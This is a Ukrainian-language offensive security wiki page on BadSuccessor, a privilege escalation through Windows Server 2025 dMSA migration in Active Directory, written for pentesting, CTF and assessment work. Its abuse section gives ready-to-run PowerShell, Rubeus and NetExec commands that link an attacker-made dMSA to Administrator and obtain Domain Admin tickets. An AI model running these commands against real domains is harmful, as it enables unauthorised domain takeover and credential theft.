# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

**BadSuccessor** зловживає workflow міграції **delegated Managed Service Account** (**dMSA**), представленим у **Windows Server 2025**. dMSA можна пов’язати з legacy account через **`msDS-ManagedAccountPrecededByLink`** і переміщувати між станами міграції, що зберігаються в **`msDS-DelegatedMSAState`**. Якщо attacker може створити dMSA у доступному для запису OU і контролювати ці атрибути, KDC може видавати tickets для dMSA, контрольованого attacker, з **authorization context пов’язаного account**.<sup>[[2]](#references)</sup>

На практиці це означає, що low-privileged user, який має лише делеговані права на OU, може створити новий dMSA, вказати його на `Administrator`, завершити стан міграції, а потім отримати TGT, PAC якого містить привілейовані групи, такі як **Domain Admins**.<sup>[[2]](#references)</sup>

## Важливі деталі міграції dMSA

- dMSA — це feature **Windows Server 2025**.
- `Start-ADServiceAccountMigration` переводить міграцію у стан **started**.
- `Complete-ADServiceAccountMigration` переводить міграцію у стан **completed**.
- `msDS-DelegatedMSAState = 1` означає, що міграцію розпочато.
- `msDS-DelegatedMSAState = 2` означає, що міграцію завершено.
- Під час легітимної міграції dMSA має прозоро замінити superseded account, тому KDC/LSA зберігають доступ, який попередній account уже мав.<sup>[[3]](#references)</sup>

Microsoft Learn також зазначає, що під час міграції оригінальний account пов’язується з dMSA, а dMSA має отримувати доступ до того, до чого мав доступ старий account.<sup>[[3]](#references)</sup> Саме цим припущенням безпеки зловживає BadSuccessor.<sup>[[2]](#references)</sup>

## Вимоги

1. Домен, у якому **існує dMSA**, тобто на стороні AD присутня підтримка **Windows Server 2025**.
2. Attacker може **створювати** об’єкти `msDS-DelegatedManagedServiceAccount` у певному OU або має еквівалентні широкі права на створення дочірніх об’єктів у ньому.
3. Attacker може **записувати** відповідні атрибути dMSA або повністю контролює щойно створений ним dMSA.
4. Attacker може запитувати Kerberos tickets із domain-joined context або через tunnel, що забезпечує доступ до LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Практичні перевірки

Найчіткішим сигналом для operator є перевірка рівня domain/forest і підтвердження того, що середовище вже використовує новий Server 2025 stack:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Якщо ви бачите такі значення, як `Windows2025Domain` і `Windows2025Forest`, розглядайте **BadSuccessor / dMSA migration abuse** як пріоритетну перевірку.

Ви також можете перелічити доступні для запису OU, делеговані для створення dMSA, за допомогою публічних інструментів:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Сценарій зловживання

1. Створіть dMSA в OU, де вам делеговано права create-child.
2. Встановіть **`msDS-ManagedAccountPrecededByLink`** у DN привілейованої цілі, наприклад `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Встановіть **`msDS-DelegatedMSAState`** у `2`, щоб позначити міграцію як завершену.
4. Запросіть TGT для нового dMSA та використайте отриманий ticket для доступу до привілейованих служб.<sup>[[2]](#references)</sup>

Приклад PowerShell:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Приклади запитів на Ticket / операційних інструментів:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Чому це більше, ніж privilege escalation

Під час легітимної міграції Windows також потрібно, щоб новий dMSA обробляв квитки, видані для попереднього облікового запису до cutover. Саме тому матеріал квитків, пов'язаний із dMSA, може містити **поточні** та **попередні** ключі у потоці **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Для fake migration, контрольованої атакувальником, така поведінка може перетворити BadSuccessor на:<sup>[[2]](#references)</sup>

- **Privilege escalation** через успадкування привілейованих SID груп у PAC.
- **Витік credential material**, оскільки обробка попереднього ключа у вразливих workflows може розкрити матеріал, еквівалентний RC4/NT hash predecessor.

Це робить техніку корисною як для прямого захоплення домену, так і для подальших операцій, таких як pass-the-hash або ширший компроміс облікових даних.

## Примітки щодо статусу patch

Початкова поведінка BadSuccessor — це **не лише теоретична проблема preview-версії 2025 року**. Microsoft присвоїла їй **CVE-2025-53779** і опублікувала security update у **серпні 2025 року**.<sup>[[4]](#references)</sup> Зберігайте опис цієї атаки для:

- **labs / CTFs / assume-breach вправ**
- **непропатчених середовищ Windows Server 2025**
- **перевірки делегування OU та exposure dMSA під час assessments**

Не припускайте, що домен Windows Server 2025 є вразливим лише через наявність dMSA; перевірте рівень patch і ретельно проведіть тестування.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
